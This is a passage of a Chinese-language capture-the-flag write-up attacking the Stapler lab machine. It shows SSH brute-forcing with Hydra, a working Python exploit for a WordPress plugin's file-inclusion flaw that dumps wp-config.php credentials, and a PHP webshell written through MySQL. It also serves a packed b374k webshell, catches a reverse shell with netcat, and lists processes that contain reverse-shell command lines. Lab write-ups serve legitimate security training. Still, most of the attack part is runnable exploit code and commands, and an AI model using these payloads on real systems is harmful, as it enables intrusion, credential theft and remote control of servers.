[RE-ATTEMPT] target 192.168.0.150 - login "kai" - pass "rolyaT" - 142 of 152 [child 5] (0/2)
[ATTEMPT] target 192.168.0.150 - login "kai" - pass "" - 143 of 152 [child 9] (0/2)
[ATTEMPT] target 192.168.0.150 - login "kai" - pass "iak" - 144 of 152 [child 0] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "NATHAN" - 145 of 152 [child 11] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 11
[RE-ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "iak" - 145 of 152 [child 0] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "NATHAN" - 145 of 152 [child 11] (0/2)
[ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "" - 146 of 152 [child 6] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 6
[RE-ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "" - 146 of 152 [child 6] (0/2)
[ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "NAHTAN" - 147 of 152 [child 10] (0/2)
[ATTEMPT] target 192.168.0.150 - login "www" - pass "www" - 148 of 152 [child 4] (0/2)
[ATTEMPT] target 192.168.0.150 - login "www" - pass "" - 149 of 152 [child 7] (0/2)
[REDO-ATTEMPT] target 192.168.0.150 - login "root" - pass "root" - 151 of 152 [child 2] (1/2)
[REDO-ATTEMPT] target 192.168.0.150 - login "daemon" - pass "daemon" - 152 of 152 [child 11] (2/2)
[STATUS] attack finished for 192.168.0.150 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-04 09:40:32

┌──(root㉿kali)-[/stapler]
└─# cat hydra.txt
# Hydra v9.3 run at 2022-07-04 09:39:40 on 192.168.0.150 ssh (hydra -L username.txt -e nsr -vV -o hydra.txt ssh://192.168.0.150)
[22][ssh] host: 192.168.0.150   login: SHayslett   password: SHayslett

┌──(root㉿kali)-[/stapler]
└─# cat hydra.txt
# Hydra v9.3 run at 2022-07-04 09:39:40 on 192.168.0.150 ssh (hydra -L username.txt -e nsr -vV -o hydra.txt ssh://192.168.0.150)
[22][ssh] host: 192.168.0.150   login: SHayslett   password: SHayslett

┌──(root㉿kali)-[/stapler]
└─# ssh SHayslett@192.168.0.150
The authenticity of host '192.168.0.150 (192.168.0.150)' can't be established.
ED25519 key fingerprint is SHA256:eKqLSFHjJECXJ3AvqDaqSI9kP+EbRmhDaNZGyOrlZ2A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.150' (ED25519) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.0.150's password:
Welcome back!


SHayslett@red:~$ id
uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)
```

## 3. 通过wordpress插件Advanced-Video-Embed
```shell
┌──(root㉿kali)-[/stapler]
└─# searchsploit Advanced Video
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Advanced Video 1.0 - Local File Inclusion                                                                  | php/webapps/39646.py
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
本地文件包含漏洞，需要注意的是：
1. 漏洞POC：http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
    我们构造的POC：https://192.168.0.150:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
2. 查看漏洞的结果是在：
   <img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/4.png" width="56%"></br>
3. <font color="red">而且需要注意他是将内容(txt)，直接复制到文件中，并将文件后缀改成了png，因此我们在浏览器中是看不到内容的，只能将图片以文本格式打开才可以看到内容。（这在39646.py--searchsploit中写的并不详细）</font>
4. 自己写了一个exp如下：
```python
# coding: utf-8
#!/usr/bin/python2

# Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation
# Google Dork: N/A
# Date: 04/01/2016
# Exploit Author: evait security GmbH
# Vendor Homepage: arshmultani - http://dscom.it/
# Software Link: https://wordpress.org/plugins/advanced-video-embed-embed-videos-or-playlists/
# Version: 1.0
# Tested on: Linux Apache / Wordpress 4.2.2

#	Timeline
#	03/24/2016 - Bug discovered
#	03/24/2016 - Initial notification of vendor
#	04/01/2016 - No answer from vendor, public release of bug


# Vulnerable Code (/inc/classes/class.avePost.php) Line 57:

#  function ave_publishPost(){
#    $title = $_REQUEST['title'];
#    $term = $_REQUEST['term'];
#    $thumb = $_REQUEST['thumb'];
# <snip>
# Line 78:
#    $image_data = file_get_contents($thumb);


# POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]

# Exploit - Print the content of wp-config.php in terminal (default Wordpress config)

from logging import NullHandler
import random
import urllib2
import re
import ssl

# context = ssl.create_default_context()
# context.check_hostname = False
# context.verify_mode = ssl.CERT_NONE

# url = "http://127.0.0.1/wordpress" # insert url to wordpress
url = "https://192.168.0.150:12380/blogblog"  # insert url to wordpress
randomID = long(random.random() * 100000000000000000L)
id_result = 0
# print(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')
objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) +
                          '&short=rnd&term=rnd&thumb=../wp-config.php', data=None, context=ssl._create_unverified_context())
content = objHtml.readlines()


# 获取文章的ID
for line in content:
    if url in line:
        rep = re.compile(url+'/\?p=\d+')
        url_result = re.findall(rep, line)
        numbers = re.findall(r'\d+', line)
        id_result = numbers[-1]
        id_result = int(id_result) / 10
# 校验图片的内容不为空。
# 获取图片的地址和内容
objHtml = urllib2.urlopen(url, context=ssl._create_unverified_context())
content = objHtml.readlines()

for line in content:
    if url+'/?p='+str(id_result) in line:
        img_result = re.search(url+'/wp-content/uploads/\d+\.jpeg', line).group(
            0) if re.search(url+'/wp-content/uploads/\d+\.jpeg', line) else None
        if img_result:
            objHtml = urllib2.urlopen(
                img_result, context=ssl._create_unverified_context())
            content = objHtml.readlines()

            if len(content) != 0:
                num = 0
                for line in content:
                    print(str(num) + ": " + line.rstrip("\n"))
                    num += 1
            else:
                print("没有获取到图片内容!!!")
    # else:
    #     print("没有找到匹配的文章ID")

# objHtml = urllib2.urlopen(url + '/?p=' + str(id), context=ssl._create_unverified_context())
# content = objHtml.readlines()
# # print(content)
# for line in content:
# 	if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
# 		urls=re.findall('"(https?://.*?)"', line)
# 		print urllib2.urlopen(urls[0], context=ssl._create_unverified_context()).read()
```

```shell
# 执行结果：
[Running] python -u "/Users/pp/Documents/vscode/exploit/python/my39646.py"
0: <?php
1: /**
2:  * The base configurations of the WordPress.
3:  *
4:  * This file has the following configurations: MySQL settings, Table Prefix,
5:  * Secret Keys, and ABSPATH. You can find more information by visiting
6:  * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
7:  * Codex page. You can get the MySQL settings from your web host.
8:  *
9:  * This file is used by the wp-config.php creation script during the
10:  * installation. You don't have to use the web site, you can just copy this file
11:  * to "wp-config.php" and fill in the values.
12:  *
13:  * @package WordPress
14:  */
15: 
16: // ** MySQL settings - You can get this info from your web host ** //
17: /** The name of the database for WordPress */
18: define('DB_NAME', 'wordpress');
19: 
20: /** MySQL database username */
21: define('DB_USER', 'root');
22: 
23: /** MySQL database password */
24: define('DB_PASSWORD', 'plbkac');
25: 
26: /** MySQL hostname */
27: define('DB_HOST', 'localhost');
28: 
29: /** Database Charset to use in creating database tables. */
30: define('DB_CHARSET', 'utf8mb4');
31: 
32: /** The Database Collate type. Don't change this if in doubt. */
33: define('DB_COLLATE', '');
34: 
35: /**#@+
36:  * Authentication Unique Keys and Salts.
37:  *
38:  * Change these to different unique phrases!
39:  * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
40:  * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
41:  *
42:  * @since 2.6.0
43:  */
44: define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
45: define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
46: define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
47: define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
48: define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
49: define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
50: define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
51: define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');
52: 
53: /**#@-*/
54: 
55: /**
56:  * WordPress Database Table prefix.
57:  *
58:  * You can have multiple installations in one database if you give each a unique
59:  * prefix. Only numbers, letters, and underscores please!
60:  */
61: $table_prefix  = 'wp_';
62: 
63: /**
64:  * For developers: WordPress debugging mode.
65:  *
66:  * Change this to true to enable the display of notices during development.
67:  * It is strongly recommended that plugin and theme developers use WP_DEBUG
68:  * in their development environments.
69:  */
70: define('WP_DEBUG', false);
71: 
72: /* That's all, stop editing! Happy blogging. */
73: 
74: /** Absolute path to the WordPress directory. */
75: if ( !defined('ABSPATH') )
76: 	define('ABSPATH', dirname(__FILE__) . '/');
77: 
78: /** Sets up WordPress vars and included files. */
79: require_once(ABSPATH . 'wp-settings.php');
80: 
81: define('WP_HTTP_BLOCK_EXTERNAL', true);

[Done] exited with code=0 in 0.339 seconds
```
```shell
   SHayslett@red:~$ mysql -u root -pplbkac
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 206
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
   ```
由于是root权限，我们考虑可以通过写webshell的方式，执行系统命令，但是需要注意：
<font color="red">exec函数只会返回单行执行结果，而passthru会返回全部执行结果。</font>
```shell
~ » php -r 'echo exec("ls");'
get-pip.py%
~ » php -r 'echo passthru("ls");'
Applications
Config.ini
Desktop
Documents
Downloads
Library
Movies
Music
Pictures
Public
get-pip.py
```
mysql写入文件：
```mysql
mysql> select "<?php @passthru($_POST['cmd']);" from test limit 1 into dumpfile '/var/www/https/blogblog/wp-content/uploads/w10.php';
Query OK, 1 row affected (0.00 sec)
```
上传一个大马：
```shell
tools/b374k [master] » php -f index.php -- -o b374k.php -p e0g18 -s -b -z gzcompress -c 9

PHP Deprecated:  Methods with the same name as their class will not be constructors in a future version of PHP; JavaScriptPacker has a deprecated constructor in /Users/pp/Documents/tools/b374k/base/jsPacker.php on line 75

Deprecated: Methods with the same name as their class will not be constructors in a future version of PHP; JavaScriptPacker has a deprecated constructor in /Users/pp/Documents/tools/b374k/base/jsPacker.php on line 75
PHP Deprecated:  Function get_magic_quotes_gpc() is deprecated in /Users/pp/Documents/tools/b374k/index.php on line 414

Deprecated: Function get_magic_quotes_gpc() is deprecated in /Users/pp/Documents/tools/b374k/index.php on line 414
b374k shell packer 0.4.2

Filename		: b374k.php
Password		: e0g18
Theme			: default
Modules			: convert,database,info,mail,network,processes
Strip			: yes
Base64			: yes
Compression		: gzcompress
Compression level	: 9
Result			: Succeeded : [ b374k.php ] Filesize : 111695
/tmp/test » python3 -m http.server 8080
Serving HTTP on :: port 8080 (http://[::]:8080/) ...
::ffff:192.168.0.154 - - [05/Jul/2022 13:36:15] "GET /b374k.php HTTP/1.1" 200 -
```
<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/5.png" width="56%"></br>
访问大马：
<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/6.png" width="56%"></br>

## 4. 通过phpmyadmin获取shell(与mysql相似，只不过是web界面操作)
<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/7.png" width="56%"></br>
访问小马，并反弹一个shell：
<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/8.png" width="56%"></br>
得到一个shell:
```shell
┌──(root㉿kali)-[/stapler]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.0.100] from (UNKNOWN) [192.168.0.150] 58676
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/https/blogblog/wp-content/uploads
```

# Post-Exploitation
## 1. sudo提权
```shell
SHayslett@red:~$ ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 18:32 ?        00:00:04 /lib/systemd/systemd --system --deserialize 25
root         2     0  0 18:32 ?        00:00:00 [kthreadd]
root         3     2  0 18:32 ?        00:00:00 [ksoftirqd/0]
root         5     2  0 18:32 ?        00:00:00 [kworker/0:0H]
root         7     2  0 18:32 ?        00:00:00 [rcu_sched]
root         8     2  0 18:32 ?        00:00:00 [rcu_bh]
root         9     2  0 18:32 ?        00:00:00 [migration/0]
root        10     2  0 18:32 ?        00:00:00 [watchdog/0]
root        11     2  0 18:32 ?        00:00:00 [kdevtmpfs]
root        12     2  0 18:32 ?        00:00:00 [netns]
root        13     2  0 18:32 ?        00:00:00 [perf]
root        14     2  0 18:32 ?        00:00:00 [khungtaskd]
root        15     2  0 18:32 ?        00:00:00 [writeback]
root        16     2  0 18:32 ?        00:00:00 [ksmd]
root        17     2  0 18:32 ?        00:00:00 [khugepaged]
root        18     2  0 18:32 ?        00:00:00 [crypto]
root        19     2  0 18:32 ?        00:00:00 [kintegrityd]
root        20     2  0 18:32 ?        00:00:00 [bioset]
root        21     2  0 18:32 ?        00:00:00 [kblockd]
root        22     2  0 18:32 ?        00:00:00 [ata_sff]
root        23     2  0 18:32 ?        00:00:00 [md]
root        24     2  0 18:32 ?        00:00:00 [devfreq_wq]
root        28     2  0 18:32 ?        00:00:00 [kswapd0]
root        29     2  0 18:32 ?        00:00:00 [vmstat]
root        30     2  0 18:32 ?        00:00:00 [fsnotify_mark]
root        31     2  0 18:32 ?        00:00:00 [ecryptfs-kthrea]
root        46     2  0 18:32 ?        00:00:00 [kthrotld]
root        47     2  0 18:32 ?        00:00:00 [acpi_thermal_pm]
root        48     2  0 18:32 ?        00:00:00 [bioset]
root        49     2  0 18:32 ?        00:00:00 [bioset]
root        50     2  0 18:32 ?        00:00:00 [bioset]
root        52     2  0 18:32 ?        00:00:00 [bioset]
root        53     2  0 18:32 ?        00:00:00 [bioset]
root        54     2  0 18:32 ?        00:00:00 [bioset]
root        55     2  0 18:32 ?        00:00:00 [bioset]
root        56     2  0 18:32 ?        00:00:00 [bioset]
root        57     2  0 18:32 ?        00:00:00 [bioset]
root        58     2  0 18:32 ?        00:00:00 [bioset]
root        59     2  0 18:32 ?        00:00:00 [bioset]
root        60     2  0 18:32 ?        00:00:00 [bioset]
root        61     2  0 18:32 ?        00:00:00 [bioset]
root        62     2  0 18:32 ?        00:00:00 [bioset]
root        63     2  0 18:32 ?        00:00:00 [bioset]
root        64     2  0 18:32 ?        00:00:00 [bioset]
root        65     2  0 18:32 ?        00:00:00 [bioset]
root        66     2  0 18:32 ?        00:00:00 [bioset]
root        67     2  0 18:32 ?        00:00:00 [bioset]
root        68     2  0 18:32 ?        00:00:00 [bioset]
root        69     2  0 18:32 ?        00:00:00 [bioset]
root        70     2  0 18:32 ?        00:00:00 [bioset]
root        71     2  0 18:32 ?        00:00:00 [bioset]
root        72     2  0 18:32 ?        00:00:00 [bioset]
root        73     2  0 18:32 ?        00:00:00 [ipv6_addrconf]
root        86     2  0 18:32 ?        00:00:00 [deferwq]
root        87     2  0 18:32 ?        00:00:00 [charger_manager]
root       132     2  0 18:32 ?        00:00:00 [kpsmoused]
root       144     2  0 18:32 ?        00:00:00 [scsi_eh_0]
root       147     2  0 18:32 ?        00:00:00 [scsi_tmf_0]
root       157     2  0 18:32 ?        00:00:00 [scsi_eh_1]
root       164     2  0 18:32 ?        00:00:00 [scsi_tmf_1]
root       165     2  0 18:32 ?        00:00:00 [scsi_eh_2]
root       173     2  0 18:32 ?        00:00:00 [scsi_tmf_2]
root       174     2  0 18:32 ?        00:00:00 [scsi_eh_3]
root       179     2  0 18:32 ?        00:00:00 [scsi_tmf_3]
root       180     2  0 18:32 ?        00:00:00 [scsi_eh_4]
root       183     2  0 18:32 ?        00:00:00 [scsi_tmf_4]
root       184     2  0 18:32 ?        00:00:00 [scsi_eh_5]
root       187     2  0 18:32 ?        00:00:00 [scsi_tmf_5]
root       188     2  0 18:32 ?        00:00:00 [scsi_eh_6]
root       190     2  0 18:32 ?        00:00:00 [scsi_tmf_6]
root       191     2  0 18:32 ?        00:00:00 [scsi_eh_7]
root       192     2  0 18:32 ?        00:00:00 [scsi_tmf_7]
root       193     2  0 18:32 ?        00:00:00 [scsi_eh_8]
root       194     2  0 18:32 ?        00:00:00 [scsi_tmf_8]
root       195     2  0 18:32 ?        00:00:00 [scsi_eh_9]
root       196     2  0 18:32 ?        00:00:00 [scsi_tmf_9]
root       197     2  0 18:32 ?        00:00:00 [scsi_eh_10]
root       198     2  0 18:32 ?        00:00:00 [scsi_tmf_10]
root       199     2  0 18:32 ?        00:00:00 [scsi_eh_11]
root       200     2  0 18:32 ?        00:00:00 [scsi_tmf_11]
root       201     2  0 18:32 ?        00:00:00 [scsi_eh_12]
root       202     2  0 18:32 ?        00:00:00 [scsi_tmf_12]
root       203     2  0 18:32 ?        00:00:00 [scsi_eh_13]
root       204     2  0 18:32 ?        00:00:00 [scsi_tmf_13]
root       205     2  0 18:32 ?        00:00:00 [scsi_eh_14]
root       206     2  0 18:32 ?        00:00:00 [scsi_tmf_14]
root       207     2  0 18:32 ?        00:00:00 [scsi_eh_15]
root       208     2  0 18:32 ?        00:00:00 [scsi_tmf_15]
root       209     2  0 18:32 ?        00:00:00 [scsi_eh_16]
root       210     2  0 18:32 ?        00:00:00 [scsi_tmf_16]
root       211     2  0 18:32 ?        00:00:00 [scsi_eh_17]
root       212     2  0 18:32 ?        00:00:00 [scsi_tmf_17]
root       213     2  0 18:32 ?        00:00:00 [scsi_eh_18]
root       214     2  0 18:32 ?        00:00:00 [scsi_tmf_18]
root       215     2  0 18:32 ?        00:00:00 [scsi_eh_19]
root       216     2  0 18:32 ?        00:00:00 [scsi_tmf_19]
root       217     2  0 18:32 ?        00:00:00 [scsi_eh_20]
root       218     2  0 18:32 ?        00:00:00 [scsi_tmf_20]
root       219     2  0 18:32 ?        00:00:00 [scsi_eh_21]
root       220     2  0 18:32 ?        00:00:00 [scsi_tmf_21]
root       221     2  0 18:32 ?        00:00:00 [scsi_eh_22]
root       222     2  0 18:32 ?        00:00:00 [scsi_tmf_22]
root       223     2  0 18:32 ?        00:00:00 [scsi_eh_23]
root       224     2  0 18:32 ?        00:00:00 [scsi_tmf_23]
root       225     2  0 18:32 ?        00:00:00 [scsi_eh_24]
root       226     2  0 18:32 ?        00:00:00 [scsi_tmf_24]
root       227     2  0 18:32 ?        00:00:00 [scsi_eh_25]
root       228     2  0 18:32 ?        00:00:00 [scsi_tmf_25]
root       229     2  0 18:32 ?        00:00:00 [scsi_eh_26]
root       230     2  0 18:32 ?        00:00:00 [scsi_tmf_26]
root       231     2  0 18:32 ?        00:00:00 [scsi_eh_27]
root       232     2  0 18:32 ?        00:00:00 [scsi_tmf_27]
root       233     2  0 18:32 ?        00:00:00 [scsi_eh_28]
root       234     2  0 18:32 ?        00:00:00 [scsi_tmf_28]
root       235     2  0 18:32 ?        00:00:00 [scsi_eh_29]
root       236     2  0 18:32 ?        00:00:00 [scsi_tmf_29]
root       245     2  0 18:32 ?        00:00:00 [mpt_poll_0]
root       249     2  0 18:32 ?        00:00:00 [mpt/0]
root       264     2  0 18:32 ?        00:00:00 [kworker/u2:28]
root       268     2  0 18:32 ?        00:00:00 [scsi_eh_30]
root       269     2  0 18:32 ?        00:00:00 [scsi_tmf_30]
root       270     2  0 18:32 ?        00:00:00 [bioset]
root       376     2  0 18:32 ?        00:00:00 [raid5wq]
root       410     2  0 18:32 ?        00:00:00 [bioset]
root       438     2  0 18:32 ?        00:00:00 [kworker/0:1H]
root       440     2  0 18:32 ?        00:00:00 [jbd2/sda1-8]
root       441     2  0 18:32 ?        00:00:00 [ext4-rsv-conver]
root       489     2  0 18:32 ?        00:00:00 [iscsi_eh]
root       491     1  0 18:32 ?        00:00:00 /lib/systemd/systemd-journald
root       495     2  0 18:32 ?        00:00:00 [ib_addr]
root       506     2  0 18:32 ?        00:00:00 [kauditd]
root       509     2  0 18:32 ?        00:00:00 [ib_mcast]
root       510     2  0 18:32 ?        00:00:00 [ib_nl_sa_wq]
root       511     2  0 18:32 ?        00:00:00 [ib_cm]
root       512     2  0 18:32 ?        00:00:00 [iw_cm_wq]
root       513     2  0 18:32 ?        00:00:00 [rdma_cm]
root       514     1  0 18:32 ?        00:00:00 /sbin/lvmetad -f
root       572     2  0 18:32 ?        00:00:00 [iprt-VBoxWQueue]
message+   621     1  0 18:32 ?        00:00:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activ
syslog     627     1  0 18:32 ?        00:00:00 /usr/sbin/rsyslogd -n
root       629     1  0 18:32 ?        00:00:00 /usr/bin/lxcfs /var/lib/lxcfs/
daemon     631     1  0 18:32 ?        00:00:00 /usr/sbin/atd -f
root       637     1  0 18:32 ?        00:00:00 /usr/sbin/acpid
root       645     2  0 18:32 ?        00:00:00 [kworker/0:7]
root       654     1  0 18:32 ?        00:00:00 /usr/sbin/cron -f
root       656     1  0 18:32 ?        00:00:00 /lib/systemd/systemd-logind
root       724     1  0 18:32 ?        00:00:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root       969     1  0 18:32 ?        00:00:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       999     1  0 18:32 ?        00:00:00 /sbin/iscsid
root      1002     1  0 18:32 ?        00:00:00 /sbin/iscsid
root      1083     1  0 18:32 ?        00:00:00 /usr/sbin/inetutils-inetd
root      1240     1  0 18:32 ?        00:00:00 dhclient enp0s3
root      1366     1  0 18:32 ?        00:00:00 /usr/lib/postfix/sbin/master
postfix   1367  1366  0 18:32 ?        00:00:00 pickup -l -t unix -u -c
postfix   1368  1366  0 18:32 ?        00:00:00 qmgr -l -t unix -u
root      1375     1  0 18:32 ?        00:00:00 /bin/bash /root/python.sh
root      1377     1  0 18:32 ?        00:00:00 /bin/bash /usr/local/src/nc.sh
root      1379     1  0 18:32 ?        00:00:00 su -c authbind php -S 0.0.0.0:80 -t /home/www/ &>/dev/null www
root      1385     1  0 18:32 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
root      1388  1377  0 18:32 ?        00:00:00 nc -nlvp 666
root      1389  1375  0 18:32 ?        00:00:00 su -c cd /home/JKanode; python2 -m SimpleHTTPServer 8888 &>/dev/null JKanode
www       1395     1  0 18:32 ?        00:00:00 /lib/systemd/systemd --user
www       1398  1395  0 18:32 ?        00:00:00 (sd-pam)
JKanode   1403     1  0 18:32 ?        00:00:00 /lib/systemd/systemd --user
JKanode   1406  1403  0 18:32 ?        00:00:00 (sd-pam)
www       1410  1379  0 18:32 ?        00:00:00 bash -c authbind php -S 0.0.0.0:80 -t /home/www/ &>/dev/null
www       1411  1410  0 18:32 ?        00:00:00 php -S 0.0.0.0:80 -t /home/www/
JKanode   1412  1389  0 18:32 ?        00:00:00 bash -c cd /home/JKanode; python2 -m SimpleHTTPServer 8888 &>/dev/null
JKanode   1413  1412  0 18:32 ?        00:00:00 python2 -m SimpleHTTPServer 8888
nobody    2399     1  0 18:48 ?        00:00:00 /usr/sbin/atftpd --daemon --tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --m
www-data  2864 27561  0 18:48 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  2865 27561  0 18:48 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  2866 27561  0 18:48 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  2867 27561  0 18:48 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  2868 27561  0 18:48 ?        00:00:00 /usr/sbin/apache2 -k start
root      5260     2  0 18:47 ?        00:00:00 [kworker/u2:0]
root     11406     1  0 18:48 ?        00:00:00 /lib/systemd/systemd-udevd
root     11501     1  0 18:48 ?        00:00:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
www-data 11504 11501  0 18:48 ?        00:00:00 php-fpm: pool www
www-data 11505 11501  0 18:48 ?        00:00:00 php-fpm: pool www
root     11607     2  0 18:50 ?        00:00:00 [kworker/0:3]
www-data 11613 27561  0 18:50 ?        00:00:00 /usr/sbin/apache2 -k start
www-data 11654  2866  0 18:57 ?        00:00:00 sh -c mknod /tmp/backpipe p;/bin/bash 0</tmp/backpipe
www-data 11665  2868  0 18:59 ?        00:00:00 sh -c mknod /tmp/backpipe p;/bin/bash 0</tmp/backpipe;nc 192.168.0.100 443 1>/tmp/bac
www-data 11667 27561  0 18:59 ?        00:00:00 /usr/sbin/apache2 -k start
www-data 11678 27561  0 19:00 ?        00:00:00 /usr/sbin/apache2 -k start
www-data 11681 27561  0 19:00 ?        00:00:00 /usr/sbin/apache2 -k start
www-data 11696 27561  0 19:01 ?        00:00:00 /usr/sbin/apache2 -k start
www-data 11698 27561  0 19:02 ?        00:00:00 /usr/sbin/apache2 -k start
www-data 11699 27561  0 19:02 ?        00:00:00 /usr/sbin/apache2 -k start
www-data 11700 27561  0 19:02 ?        00:00:00 /usr/sbin/apache2 -k start
www-data 11735  2864  0 19:06 ?        00:00:00 sh -c uname -a; w; id; /bin/sh -i
www-data 11739 11735  0 19:06 ?        00:00:00 /bin/sh -i
www-data 11747 11739  0 19:08 ?        00:00:00 python -c import pty; pty.spawn("/bin/bash");
www-data 11748 11747  0 19:08 pts/0    00:00:00 /bin/bash
www-data 11831 11613  0 19:12 ?        00:00:00 sh -c mknod /tmp/backpipe p;/bin/bash 0</tmp/backpipe | nc 192.168.0.100 443 1>/tmp/b
www-data 11833 11831  0 19:12 ?        00:00:00 /bin/bash
www-data 11834 11831  0 19:12 ?        00:00:00 nc 192.168.0.100 443
root     11872 16445  0 19:20 ?        00:00:00 sshd: SHayslett [priv]
SHaysle+ 11875     1  0 19:20 ?        00:00:00 /lib/systemd/systemd --user
SHaysle+ 11877 11875  0 19:20 ?        00:00:00 (sd-pam)
SHaysle+ 11886 11872  0 19:20 ?        00:00:00 sshd: SHayslett@pts/1
SHaysle+ 11887 11886  0 19:20 pts/1    00:00:00 -bash
root     12111     2  0 18:48 ?        00:00:00 [xfsalloc]
root     12112     2  0 18:48 ?        00:00:00 [xfs_mru_cache]
root     12119     2  0 18:48 ?        00:00:00 [jfsIO]
root     12120     2  0 18:48 ?        00:00:00 [jfsCommit]
root     12121     2  0 18:48 ?        00:00:00 [jfsSync]
root     12151     2  0 19:30 ?        00:00:00 [kworker/u2:1]
root     12204     2  0 19:32 ?        00:00:00 [kworker/0:0]
root     12207     2  0 19:32 ?        00:00:00 [kworker/0:1]
root     12209     2  0 19:32 ?        00:00:00 [kworker/0:2]
SHaysle+ 12223 11887  0 19:34 pts/1    00:00:00 ps -ef
root     12444     1  0 18:48 ?        00:00:00 /usr/sbin/smbd -D
root     12447 12444  0 18:48 ?        00:00:00 /usr/sbin/smbd -D
root     12449 12444  0 18:48 ?        00:00:00 /usr/sbin/smbd -D
root     12521     1  0 18:48 ?        00:00:00 /usr/sbin/nmbd -D
mysql    12863     1  0 18:48 ?        00:00:00 /usr/sbin/mysqld
root     16445     1  0 18:48 ?        00:00:00 /usr/sbin/sshd -D
dnsmasq  17122     1  0 18:48 ?        00:00:00 /usr/sbin/dnsmasq -x /var/run/dnsmasq/dnsmasq.pid -u dnsmasq -7 /etc/dnsmasq.d,.dpkg-
root     27561     1  0 18:48 ?        00:00:00 /usr/sbin/apache2 -k start
SHayslett@red:~$ cd /home/JKanode
SHayslett@red:/home/JKanode$ ls -al
total 28
drwxr-xr-x  3 JKanode JKanode 4096 Jul  5 19:24 .
drwxr-xr-x 32 root    root    4096 Jun  4  2016 ..
-rw-r--r--  1 JKanode JKanode  188 Jul  5 19:24 .bash_history
-rw-r--r--  1 JKanode JKanode  220 Sep  1  2015 .bash_logout
